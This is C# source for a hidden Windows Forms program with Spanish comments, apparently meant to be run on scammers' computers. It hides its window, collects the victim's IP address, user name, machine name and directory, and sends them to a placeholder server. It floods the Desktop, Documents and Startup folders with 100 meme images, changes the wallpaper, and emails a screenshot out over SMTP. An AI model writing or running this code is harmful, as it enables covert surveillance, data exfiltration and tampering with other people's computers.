 public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
       
       [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
 
       string backgroundImageUrl = "https://cdn.meme.am/instances/500x/64226723.jpg"; //URL del fondo de pantalla
       
        //Cambiamos el fondo de pantalla
        public void SetWallpaper(String path)
        {
            SystemParametersInfo(0x14, 0, path, 0x01 | 0x02);
        }
 
        //Descargamos la imagen de la pagina web.
        private void SetWallpaperFromWeb(string url, string path)
        {
            WebClient webClient = new WebClient();
            webClient.DownloadFile(new Uri(url), path);
            SetWallpaper(path);
        }
 
        private void Form1_Load(object sender, EventArgs e)
        {
           //Sacamos datos como IP, ruta de ejecución, nombre de la máquina etc.. y lo enviamos a un servidor propio:
 
            string ip = new System.Net.WebClient().DownloadString("https://ipinfo.io/ip").Replace("\n", "");
 
            string ruta = Directory.GetCurrentDirectory();
 
            string maquina = Environment.MachineName + " ----- " + Environment.UserName + " ----- " + Environment.OSVersion
 
            string sURL;
            //Recibe php debe recoger los siguientes parametros y almacenarlos ya sea un txt o en una BD
 
            sURL = "http://www.url.com/recibe.php?ip=" + ip + "&ruta=" + ruta + "&maquina=" + maquina;
 
            WebRequest wrGETURL;
            wrGETURL = WebRequest.Create(sURL);
            wrGETURL.GetResponse();
 
            //Definimos los directorios donde queremos guardar un bonito recuerdo (100 imagenes)
 
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string documentos = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments);
            string musica = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            string imagenes = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
            string personal = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
            string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
 
 
              //100 imagenes o las que queramos :D
              //Se podria guardar una vez y copiarla, pero de esta manera, se puede generar "DDoS" si queremos.
              int i = 0;
              while (i<100)
              {
                  using (WebClient Client = new WebClient())
                  {
                      //Descargamos la imagen y la guardamos.
                      Client.DownloadFile("http://memesvault.com/wp-content/uploads/Dancing-Troll-Meme-06.jpg", desktop + "/troll" + i + ".jpg");
                      Client.DownloadFile("http://memesvault.com/wp-content/uploads/Dancing-Troll-Meme-06.jpg", documentos + "/troll" + i + ".jpg");
                      Client.DownloadFile("http://memesvault.com/wp-content/uploads/Dancing-Troll-Meme-06.jpg", musica + "/troll" + i + ".jpg");
                      Client.DownloadFile("http://memesvault.com/wp-content/uploads/Dancing-Troll-Meme-06.jpg", imagenes + "/troll" + i + ".jpg");
                      Client.DownloadFile("http://memesvault.com/wp-content/uploads/Dancing-Troll-Meme-06.jpg", personal + "/troll" + i + ".jpg");
                      Client.DownloadFile("http://memesvault.com/wp-content/uploads/Dancing-Troll-Meme-06.jpg", startup + "/troll" + i + ".jpg");
                      i++;
                  }
              }
 
           //Cambiamos nuestro fondo de pantalla y
           //finalizada la descarga de todas las imagenes, hacemos una captura de pantalla(la enviamos por mail), seguro que ha quedado precioso ^^
 
            Bitmap bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
 
            Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
 
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
 
            bmpScreenshot.Save("prueba.png", ImageFormat.Png);
 
 
            string rutaca = ruta + @"\prueba.png";
           
 
            string backgroundImageName = rutaca;
            SetWallpaperFromWeb(backgroundImageUrl, backgroundImageName);
 
           
 
            bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
 
            gfxScreenshot = Graphics.FromImage(bmpScreenshot);
 
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
 
            bmpScreenshot.Save("prueba1.png", ImageFormat.Png);
            string rutacah = ruta + @"\prueba1.png";
 
            //Enviamos por mail la captura de pantalla.
            SendMail(ip,ruta,maquina,rutacah);
 
            
            Close();
        }
 
        private void Form1_Shown(object sender, EventArgs e)
        {
            //Ocultamos el Form1
            Visible = false;
            Opacity = 10000000000;
        }
        
        //Funcion para guardar la captura en el correo.
        public static void SendMail(string ip, string ruta, string maquina, string rutacah)
        {
            try
            {
                var mailaddress = "correo@outlook.com";
                var smtpHost = "smtp.live.com";
                var smtpPort = Convert.ToInt32("587");
                var mailpassword = "password";
                string body = "Los estafadores han picado!!" + ip + "<br/>" + ruta + "<br/>" + maquina;
                
                 
                var fromAddress = new MailAddress(mailaddress, "Pwned Estafadores");
                var toAddress = new MailAddress(mailaddress, "Pwned Estafadores");
                const string subject = "Datos del pwned v3";
                
                   
                var smtp = new SmtpClient
                {
                    Host = smtpHost,
                    Port = smtpPort,
                    EnableSsl = true,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(fromAddress.Address, mailpassword)
                };
                using (var message = new MailMessage(fromAddress, toAddress)
                {
                    Subject = subject,
                    Body = body,
                })
                {
                    message.Attachments.Add(new System.Net.Mail.Attachment(rutacah));
                    smtp.Send(message);
                    
                }
            }
            catch (Exception ex)
            {
               // MessageBox.Show(string.Format("Error al enviar el correo! \n {0}", ex.Message), "Error!");
                return;
            }
        }
            
 
 
    }  
